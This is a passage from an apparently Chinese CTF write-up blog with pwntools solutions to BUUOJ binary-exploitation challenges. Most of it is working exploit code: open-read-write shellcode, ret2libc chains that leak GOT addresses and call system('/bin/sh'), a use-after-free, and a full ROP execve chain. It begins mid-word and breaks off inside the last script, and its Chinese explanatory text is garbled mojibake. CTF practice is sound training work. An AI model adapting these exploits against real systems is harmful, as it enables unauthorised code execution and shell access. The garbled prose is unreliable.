¼å¼ï¼Œè‡ªå·±å†™ä¸ªshellæ±‡ç¼–ã€‚</p><p>ä¸‹é¢ä¼°è®¡å¯ä»¥ç›´æ¥æŠ„ã€‚</p><p>æ€è·¯ï¼š</p><ul><li>æ‰“å¼€flagæ–‡ä»¶ï¼Œ<code>sys_open(file,0,0)</code>ï¼›ç³»ç»Ÿè°ƒç”¨å·ä¸º5</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs æ±‡ç¼–">push 0x0  #å­—ç¬¦ä¸²ç»“å°¾<br>push 0x67616c66#&#x27;flags&#x27;<br>mov ebx,esp<br>xor ecx,ecx#0<br>xor edx,edx#0<br>mov eax,0x5#è°ƒç”¨å·<br>int 0x80#sys_open(flags,0,0)<br></code></pre></td></tr></table></figure><ul><li>è¯»flagæ–‡ä»¶ï¼Œ<code>sys_read(3,file,0x100)</code>ï¼›ç³»ç»Ÿè°ƒç”¨å·ä¸º3</li></ul><p><code>mov eax,0x3;</code><br><code>mov ecx,ebx;# ecx = char __user *buf ç¼“å†²åŒºï¼Œè¯»å‡ºçš„æ•°æ®--&gt;ä¹Ÿå°±æ˜¯è¯»â€œflagâ€</code><br><code>mov ebx,0x3;# æ–‡ä»¶æè¿°ç¬¦ fd:æ˜¯æ–‡ä»¶æè¿°ç¬¦ 0 1 2 3 ä»£è¡¨æ ‡å‡†çš„è¾“å‡ºè¾“å…¥å’Œå‡ºé”™,å…¶ä»–æ‰“å¼€çš„æ–‡ä»¶</code><br><code>mov edx,0x100;#å¯¹åº”å­—èŠ‚æ•°</code><br><code>int 0x80;</code></p><ul><li>è¾“å‡ºflagæ–‡ä»¶å†…å®¹ï¼Œ<code>sys_write(1,file,0x30)</code>ï¼›ç³»ç»Ÿè°ƒç”¨å·ä¸º4</li></ul><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">mov</span> eax,0x4;<span class="hljs-comment"># eax = sys_write</span><br><span class="hljs-attribute">mov</span> ebx,0x1;<span class="hljs-comment"># ebx = unsigned int fd = 1</span><br><span class="hljs-attribute">int</span> 0x80;<br></code></pre></td></tr></table></figure><p>æå¾—å¾ˆéº»çƒ¦ï¼Œæœ‰æ›´ç®€æ´çš„ï¼Œexpï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">25103</span>)<br>shell = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">push 0x0</span><br><span class="hljs-string">push 0x67616c66</span><br><span class="hljs-string">mov ebx,esp</span><br><span class="hljs-string">xor ecx,ecx</span><br><span class="hljs-string">xor edx,edx</span><br><span class="hljs-string">mov eax,0x5</span><br><span class="hljs-string">int 0x80</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br>shell+=asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov eax,0x3</span><br><span class="hljs-string">mov ecx,ebx</span><br><span class="hljs-string">mov ebx,0x3</span><br><span class="hljs-string">mov edx,0x100</span><br><span class="hljs-string">int 0x80</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br>shell+=asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov eax,0x4</span><br><span class="hljs-string">mov ebx,0x1</span><br><span class="hljs-string">int 0x80</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br><span class="hljs-comment">#context.binary=&#x27;orw&#x27;</span><br><span class="hljs-comment">#elf=ELF(&#x27;orw&#x27;)</span><br><span class="hljs-comment">#shell=shellcraft.open(&#x27;./flag&#x27;)</span><br><span class="hljs-comment">#shell+=shellcraft.read(&#x27;eax&#x27;,&#x27;esp&#x27;,100)</span><br><span class="hljs-comment">#shell+=shellcraft.write(1,&#x27;esp&#x27;,100)</span><br><span class="hljs-comment">#shell=asm(shell)</span><br>r.sendlineafter(<span class="hljs-string">&quot;Give my your shellcode:&quot;</span>,shell)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="picoctf-2018-buffer-overflow-2">picoctf_2018_buffer overflow 2</h3><p>å¿˜å…‰äº†ï¼Œè®°ä¸€ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">28901</span>)<br>win=<span class="hljs-number">0x80485cb</span><br>a1=<span class="hljs-number">0xDEADBEEF</span><br>a2=<span class="hljs-number">0xDEADC0DE</span><br>r.sendline(<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x6c</span>+<span class="hljs-string">&#x27;bbbb&#x27;</span>+p32(win)+p32(<span class="hljs-number">0</span>)+p32(a1)+p32(a2))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="xdctf2015-pwn200">xdctf2015_pwn200</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">27228</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./bof&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br>r.recvline()<br>r.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x6c</span>+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">4</span>+p32(elf.sym[<span class="hljs-string">&#x27;write&#x27;</span>])+p32(<span class="hljs-number">0x80484d6</span>)+p32(<span class="hljs-number">1</span>)+p32(elf.got[<span class="hljs-string">&#x27;write&#x27;</span>])+p32(<span class="hljs-number">8</span>))<br>true=u32(r.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(true)<br>base=true-libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(base)<br>system=base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh=base+<span class="hljs-number">0x15902b</span><br>r.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x6c</span>+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">4</span>+p32(system)+p32(<span class="hljs-number">0</span>)+p32(binsh))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="jarvisoj-level1">jarvisoj_level1</h3><p>å¿˜äº†nxçš„åšæ³•ï¼Œä¸è¿‡æ—¢ç„¶ä¿æŠ¤ä»€ä¹ˆéƒ½æ²¡å¼€ï¼Œç›´æ¥ret2libc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">25716</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./level1&#x27;</span>)<br>context.arch=<span class="hljs-string">&#x27;i386&#x27;</span><br>sc=asm(shellcraft.sh())<br>r.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span>+<span class="hljs-string">&#x27;bbbb&#x27;</span>+p32(elf.sym[<span class="hljs-string">&#x27;write&#x27;</span>])+p32(elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>])+p32(<span class="hljs-number">1</span>)+p32(elf.got[<span class="hljs-string">&#x27;write&#x27;</span>])+p32(<span class="hljs-number">4</span>))<br>true=u32(r.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(true)<br>base=true-libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>system=base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh=base+<span class="hljs-number">0x15902b</span><br>r.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span>+<span class="hljs-string">&#x27;bbbb&#x27;</span>+p32(system)+p32(<span class="hljs-number">0</span>)+p32(binsh))<br>r.interactive()<br><br><br></code></pre></td></tr></table></figure><h3 id="ciscn-2019-n-3">ciscn_2019_n_3</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import * </span><br>local_file  = <span class="hljs-string">&#x27;./ciscn_2019_n_3&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">28934</span>)<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#--------------------------------------------</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">new</span>(<span class="hljs-params">index,typ,value,length</span>):<br> sla(<span class="hljs-string">&#x27;CNote &gt; &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;Index &gt; &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br> sla(<span class="hljs-string">&#x27;Type &gt; &#x27;</span>,<span class="hljs-built_in">str</span>(typ))<br> <span class="hljs-keyword">if</span> typ==<span class="hljs-number">2</span>:<br>    sla(<span class="hljs-string">&#x27;Length &gt; &#x27;</span>,<span class="hljs-built_in">str</span>(length))<br> sla(<span class="hljs-string">&#x27;Value &gt; &#x27;</span>,<span class="hljs-built_in">str</span>(value))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params">index</span>):<br> sla(<span class="hljs-string">&#x27;CNote &gt; &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;Index &gt; &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br> sla(<span class="hljs-string">&#x27;CNote &gt; &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;Index &gt; &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-comment">#-------------------------------------------</span><br>new(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1234</span>)<br>new(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5678</span>)<br>dele(<span class="hljs-number">0</span>)<br>dele(<span class="hljs-number">1</span>)<br>value=<span class="hljs-string">&#x27;sh\x00\x00&#x27;</span>+p32(elf.sym[<span class="hljs-string">&#x27;system&#x27;</span>])<br>new(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,value,<span class="hljs-number">0xc</span>)<br>dele(<span class="hljs-number">0</span>)<br><span class="hljs-comment">#gdb.attach(r)</span><br>r.interactive()<br></code></pre></td></tr></table></figure><p>è¿™é¢˜ç”¨åˆ°uafï¼Œçœ‹ä»£ç è¦çŸ¥é“æ˜¯ä¸¤ç§æŒ‡é’ˆæ•°ç»„ï¼Œæœ‰systemå‡½æ•°ï¼Œèµ·åˆ°ä¿®æ”¹ä½œç”¨çš„æ˜¯stringç±»å‹æ•°ç»„æŒ‡é’ˆï¼Œåˆ©ç”¨uafï¼Œå¯ä»¥æ”¹åˆ°å‰ä¸€å—çš„æŒ‡é’ˆä¸ºsystemï¼Œå†å‰ä½ä¸ºsh(32ä½è¦å¯¹é½)ï¼Œï¼ˆå…·ä½“æ“ä½œå°±æ˜¯ç”³è¯·ï¼Œé‡Šæ”¾ä¹‹ç±»æ“ä½œï¼‰ï¼Œæœ€åç”¨ä¿®æ”¹åéšæ„ç”¨ä¸ªå¸¦åŠ¨</p><h3 id="bbys-tu-2016">bbys_tu_2016</h3><p>æœ€ç®€å•çš„é¢˜å±…ç„¶å¡ä½äº†ä¸€ä¼šï¼Œå¡«å……è¦è°ƒè¯•å¾—åº”è¯¥</p><p>gdbç”¨pattern offest ï¼Ÿ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">29342</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./bbys_tu_2016&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>)<br>r.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x14</span>+<span class="hljs-string">&#x27;bbbb&#x27;</span>+p32(<span class="hljs-number">0x804856d</span>))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="inndy-rop">inndy_rop</h3><p>è¿™é¢˜é™æ€ç¼–è¯‘ï¼Œèƒ½ç›´æ¥æº¢å‡º</p><p>å¿«é€Ÿæ„é€ ropé“¾çš„å‘½ä»¤ï¼š</p><p>ROPgadget --binary rop --ropchain</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">29714</span>)<br><br>elf=ELF(<span class="hljs-string">&#x27;./rop&#x27;</span>)<br>p = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xc</span>+<span class="hljs-string">&#x27;bbbb&#x27;</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806ecda</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea060</span>) <span class="hljs-comment"># @ .data</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080b8016</span>) <span class="hljs-comment"># pop eax ; ret</span><br>p += <span class="hljs-string">&#x27;/bin&#x27;</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0805466b</span>) <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806ecda</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea064</span>) <span class="hljs-comment"># @ .data + 4</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080b8016</span>) <span class="hljs-comment"># pop eax ; ret</span><br>p += <span class="hljs-string">&#x27;//sh&#x27;</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0805466b</span>) <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806ecda</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea068</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080492d3</span>) <span class="hljs-comment"># xor eax, eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0805466b</span>) <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080481c9</span>) <span class="hljs-comment"># pop ebx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea060</span>) <span class="hljs-comment"># @ .data</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080de769</span>) <span class="hljs-comment"># pop ecx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea068</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806ecda</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea068</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080492d3</span>) <span class="hljs-comment"># xor eax, eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806c943</span>) <span class="hljs-comment"># int 0x80</span><br>r.sendline(p)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="roarctf-2019-easy-pwn">roarctf_2019_easy_pwn</h3><p>off-by-oneæ¼æ´ï¼Œç„¶åchunk extendï¼Œå…ˆæ±‚å¾—main_arenaé™„è¿‘çš„åœ°å€ï¼ˆé unsortbinï¼‰,main_arenaåœ°å€å¯ç”±idaçœ‹libcé‡Œé¢çš„malloc_trimå‡½æ•°çš„v22å¾—ï¼Œå¾—åˆ°baseåï¼Œæ”¹ä¸ªchunkçš„sizeä¸º0x71(ç‰¹å®šçš„)ï¼Œé‡Œé¢fdå¡«hook-åç§»ï¼ˆé åç§»çš„7fä½œä¸ºsizeç»•è¿‡æ£€æŸ¥ï¼‰çš„åœ°å€ï¼Œç”³è¯·ä¸¤æ¬¡åï¼Œåä¸€ä¸ªchunkåˆ†é…åˆ°hooké™„è¿‘ï¼Œç„¶åfillï¼Œç”±äºåœ¨mallocé‡Œå¡«ogæ‰“ä¸é€šï¼Œæ‰€ä»¥æ”¹ä¸ºmalloc_hookå‰ä¸€ä¸ªçš„reallocå¡«ogï¼Œè€ŒåŸæœ¬çš„malloc_hookä¸­å†™reallocä¸­pushçš„åœ°å€ï¼Œæœ€åå¥½åƒreallocä¼šå…ˆpushå†è·³è½¬åˆ°reallocä¸Šçš„åœ°å€ã€‚è¿™é¢˜å†™äº†æˆ‘ä¸¤å¤©orzï¼ˆæœ€åå°±æ˜¯ï¼Œæœ¬åœ°EOFï¼Œè¿œç«¯å´æ‰“å¾—é€šï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import * </span><br>local_file  = <span class="hljs-string">&#x27;./roarctf_2019_easy_pwn&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span 